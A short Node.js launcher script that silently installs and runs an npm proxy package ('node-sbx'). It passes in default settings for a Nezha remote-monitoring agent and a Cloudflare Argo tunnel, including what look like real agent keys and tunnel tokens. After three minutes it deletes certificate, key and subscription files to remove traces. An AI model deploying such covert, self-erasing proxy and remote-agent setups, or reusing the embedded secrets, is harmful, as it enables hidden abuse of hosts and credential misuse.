const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// Configuration
process.env.UUID = process.env.UUID || 'faacf142-dee8-48c2-8558-641123eb939c';
process.env.NEZHA_SERVER = process.env.NEZHA_SERVER || 'nezha.mingfei1981.eu.org';
process.env.NEZHA_PORT = process.env.NEZHA_PORT || '443';
process.env.NEZHA_KEY = process.env.NEZHA_KEY || 'nZ478ktFuanDsrqOsS';
process.env.ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'elysiannodes2028.mingfei.de5.net';
process.env.ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiYjY3MjAwMTItYjhjNS00Mzk1LWJjMzUtZWQ4Njg5N2UzM2ZiIiwicyI6IllXSXlNalJtTlRJdE1UWmxaaTAwTUdJekxXRm1Zall0TnpKaU5EbGlOVEJpWTJZMSJ9';

const filesToDelete = [
    'cert.pem',
    'key.txt',
    'private.key',
    'sub.txt'
];

async function start() {
    try {
        // Silent dependency installation
        execSync('npm install node-sbx --quiet --no-progress', { stdio: 'ignore' });

        // Start the core process silently
        const sbx = spawn('npx', ['node-sbx'], {
            stdio: 'ignore',
            shell: true,
            env: process.env
        });

        // Background cleanup task: Wait 3 minutes (180000ms) then delete files
        setTimeout(() => {
            const npmFolder = path.join(process.cwd(), '.npm');
            filesToDelete.forEach(file => {
                const filePath = path.join(npmFolder, file);
                if (fs.existsSync(filePath)) {
                    try {
                        fs.unlinkSync(filePath);
                    } catch (err) {
                        // Silent fail
                    }
                }
            });
        }, 180000);

        // Keep parent process alive
        sbx.on('exit', (code) => process.exit(code));
        process.on('SIGINT', () => sbx.kill('SIGINT'));
        process.on('SIGTERM', () => sbx.kill('SIGTERM'));

    } catch (error) {
        process.exit(1);
    }
}

start();